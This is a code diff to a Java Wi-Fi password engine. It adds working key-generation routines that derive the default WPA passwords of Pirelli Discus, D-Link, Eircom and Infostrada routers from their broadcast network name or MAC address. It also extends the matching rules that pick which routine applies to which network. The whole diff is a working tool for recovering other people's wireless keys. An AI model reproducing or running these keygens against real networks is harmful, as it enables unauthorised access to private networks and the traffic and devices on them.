@@ -1052,6 +1052,123 @@ public class Wifi_password_engine
 		return new PasswordDictionary("HG824xKeygen",words,"");
 	}
 	//-----------------------------------------------------------------------------------------------------------------------
+	public static PasswordDictionary				Pirelli_Discuss_DRG_A225(String essid)
+	{
+		//pulwifi core
+		ArrayList<String> words = new ArrayList<String>();
+		words.add("YW0"+Integer.toString((Integer.parseInt(essid,16) - 0xD0EC31) >> 2));
+		return new PasswordDictionary("Pirelli_Discuss_DRG_A225",words,"");
+	}
+	//-----------------------------------------------------------------------------------------------------------------------
+	public static PasswordDictionary				Dlink(Mac bssid)
+	{
+		//pulwifi core
+		ArrayList<String> words = new ArrayList<String>();
+		// Delete dots from bssid and use caps only...
+		String bssid_data = bssid.get_mac("",true);
+
+		// Select inportant data from bssid...
+		char[] data = new char[20];
+		data[0] = bssid_data.charAt(11);
+		data[1] = bssid_data.charAt(0);
+		data[2] = bssid_data.charAt(10);
+		data[3] = bssid_data.charAt(1);
+		data[4] = bssid_data.charAt(9);
+		data[5] = bssid_data.charAt(2);
+		data[6] = bssid_data.charAt(8);
+		data[7] = bssid_data.charAt(3);
+		data[8] = bssid_data.charAt(7);
+		data[9] = bssid_data.charAt(4);
+		data[10] = bssid_data.charAt(6);
+		data[11] = bssid_data.charAt(5);
+		data[12] = bssid_data.charAt(1);
+		data[13] = bssid_data.charAt(6);
+		data[14] = bssid_data.charAt(8);
+		data[15] = bssid_data.charAt(9);
+		data[16] = bssid_data.charAt(11);
+		data[17] = bssid_data.charAt(2);
+		data[18] = bssid_data.charAt(4);
+		data[19] = bssid_data.charAt(10);
+
+		// Process key throught the real algorithm...
+		char[] key = new char[20];
+		char hash[] = { 'X', 'r', 'q', 'a', 'H', 'N', 'p', 'd', 'S', 'Y', 'w','8', '6', '2', '1', '5' };
+		int index = 0;
+		for (int i = 0; i < 20; i++) 
+		{
+			if ((data[i] >= '0') && (data[i] <= '9'))		{	index = data[i] - '0';								}
+			else if ((data[i] >= 'A') && (data[i] <= 'F'))	{	index = data[i] - 'A' + 10;							}
+			else											{	return new PasswordDictionary("",words,"error!");	}	//there was an error
+			key[i] = hash[index];
+		}
+
+		// Return the key...
+		words.add(String.valueOf(key, 0, 20));
+		return new PasswordDictionary("Dlink",words,"");
+	}
+	//-----------------------------------------------------------------------------------------------------------------------
+	public static PasswordDictionary				Eircom(Mac bssid)
+	{
+		String mac = bssid.get_mac("",false);
+		byte[] routerMAC = new byte[4];
+		routerMAC[0] = 1;
+		for(int i = 0; i < 6; i += 2)
+		{
+			routerMAC[i / 2 + 1] = (byte) ((Character.digit(mac.charAt(i), 16) << 4) + Character.digit(mac.charAt(i + 1), 16));
+		}
+		int macDec = ((0xFF & routerMAC[0]) << 24) | ((0xFF & routerMAC[1]) << 16) | ((0xFF & routerMAC[2]) << 8) | (0xFF & routerMAC[3]);
+		mac = Wifi_password_engine.dectoString(macDec) + "Although your world wonders me, ";
+		ArrayList<String> words=new ArrayList<String>();
+		try
+		{
+			//TODO! esto debería revisarlo
+			byte[] hash=StringUtils.sha1(mac.getBytes()).getBytes();
+			words.add(StringUtils.getHexString(hash).substring(0,26));
+		}
+		catch(NoSuchAlgorithmException e)
+		{
+			return new PasswordDictionary("Eircom",words,"NoSuchAlgorithmException: sha1");
+		}
+		catch(UnsupportedEncodingException e)
+		{
+			return new PasswordDictionary("Eircom",words,"UnsupportedEncodingException");
+		}
+		return new PasswordDictionary("Eircom",words,"");
+	}
+	//-----------------------------------------------------------------------------------------------------------------------
+	private static String							dectoString(int mac) 
+	{
+		//used in Eircom
+		String ret = "";
+		while(mac > 0) 
+		{
+			switch(mac % 10) 
+			{
+				case 0:		ret = "Zero" + ret;		break;
+				case 1:		ret = "One" + ret;		break;
+				case 2:		ret = "Two" + ret;		break;
+				case 3:		ret = "Three" + ret;	break;
+				case 4:		ret = "Four" + ret;		break;
+				case 5:		ret = "Five" + ret;		break;
+				case 6:		ret = "Six" + ret;		break;
+				case 7:		ret = "Seven" + ret;	break;
+				case 8:		ret = "Eight" + ret;	break;
+				case 9:		ret = "Nine" + ret;		break;
+			}
+			mac /= 10;
+		}
+		return ret;
+	}
+	//-----------------------------------------------------------------------------------------------------------------------
+	public static PasswordDictionary				Infostrada(Mac bssid)
+	{
+		ArrayList<String> words = new ArrayList<String>();
+		// Delete dots from bssid and use caps only...
+		String bssid_data = bssid.get_mac("",true);
+		words.add(2 + bssid_data);
+		return new PasswordDictionary("Infostrada",words,"");		
+	}
+	//-----------------------------------------------------------------------------------------------------------------------
 	//-----------------------------------------------------------------------------------------------------------------------
 	//-----------------------------------------------------------------------------------------------------------------------
 	//FROM MAC TO PASSWORDS--------------------------------------------------------------------------------------------------
@@ -1064,6 +1181,22 @@ public class Wifi_password_engine
 		try{mac_mac=new Mac(mac);} catch (UnparseableMacException e) {}
 		ArrayList<PasswordDictionary> result=new ArrayList<PasswordDictionary>();
 
+		if(essid.matches("Discus--([0-9a-fA-F]{6})"))
+		{
+			result.add(Wifi_password_engine.Pirelli_Discuss_DRG_A225(essid));
+		}
+		if(essid.matches("DLink-([0-9a-fA-F]{6})"))
+		{
+			result.add(Wifi_password_engine.Dlink(mac_mac));
+		}
+        if(essid.matches("[eE]ircom[0-7]{4} ?[0-7]{4}") || mac.startsWith("00:0F:CC")	) 
+        {
+        	result.add(Wifi_password_engine.Eircom(mac_mac));
+        }
+        if (essid.matches("InfostradaWiFi-[0-9a-zA-Z]{6}"))
+        {
+			result.add(Wifi_password_engine.Infostrada(mac_mac));
+        }
 		if(mac.startsWith("9C:41:7C"))
 		{
 			result.add(Wifi_password_engine.ZTE_W5(mac));
@@ -1277,20 +1410,6 @@ public class Wifi_password_engine
 			result.add(new PasswordDictionary("DlinkKeygen(eessid, mac)",null,"DlinkKeygen TODO! pending"));
         }
 
-        if (essid.matches("[eE]ircom[0-7]{4} ?[0-7]{4}")) 
-        {
-        	/*
-        	if (mac.length() == 0) 
-        	{
-        		final String filteredessid = essid.replace(" ", "");
-        		final String end = Integer.toHexString(Integer.parseInt(filteredessid.substring(filteredessid.length() - 8), 8) ^ 0x000fcc);
-        		mac = "00:0F:CC" + ":" + end.substring(0, 2) + ":"+ end.substring(2, 4) + ":" + end.substring(4, 6);
-        	}
-        	keygens.add(new EircomKeygen(essid, mac));
-        	*/
-			//TODO!
-			result.add(new PasswordDictionary("EircomKeygen(eessid, mac)",null,"EircomKeygen TODO! pending"));
-        }
 
         if (essid.matches("INFINITUM[0-9a-zA-Z]{4}") 
         		|| mac.startsWith("00:18:82") || mac.startsWith("00:1E:10")
@@ -1352,7 +1471,9 @@ public class Wifi_password_engine
                 || mac.startsWith("F4:9F:F3") || mac.startsWith("F4:C7:14") || mac.startsWith("F4:DC:F9")
                 || mac.startsWith("F4:E3:FB") || mac.startsWith("F8:01:13") || mac.startsWith("F8:3D:FF")
                 || mac.startsWith("F8:4A:BF") || mac.startsWith("F8:98:B9") || mac.startsWith("F8:BF:09")
-                || mac.startsWith("F8:E8:11") || mac.startsWith("FC:48:EF") || mac.startsWith("FC:E3:3C"))
+                || mac.startsWith("F8:E8:11") || mac.startsWith("FC:48:EF") || mac.startsWith("FC:E3:3C")
+                || mac.startsWith("00:19:15") || mac.startsWith("00:11:F5")	|| mac.startsWith("00:0F:E2")
+			)
         {
         	result.add(Wifi_password_engine.HuaweiKeygen(essid,mac));
         }
@@ -1382,11 +1503,6 @@ public class Wifi_password_engine
 			result.add(Wifi_password_engine.HG824xKeygen(essid,mac_mac));
         }
 
-        if (essid.matches("InfostradaWiFi-[0-9a-zA-Z]{6}"))
-        {
-			//TODO!
-			result.add(new PasswordDictionary("InfostradaKeygen(eessid, mac)",null,"InfostradaKeygen TODO! pending"));
-        }
 
         if (essid.startsWith("InterCable")	&& (mac.startsWith("00:15") || mac.startsWith("00:1D")))
         {
@@ -1634,7 +1750,7 @@ public class Wifi_password_engine
 
         
 
-        if (essid.matches("(WLAN|WiFi|YaCom)[0-9a-zA-Z]{6}"))
+        if (essid.matches("(WLAN|WiFi|WIFI|YaCom|YACOM)[0-9a-zA-Z]{6}"))
         {
         	result.add(Wifi_password_engine.Wlan6Keygen(essid,mac_mac));
         }
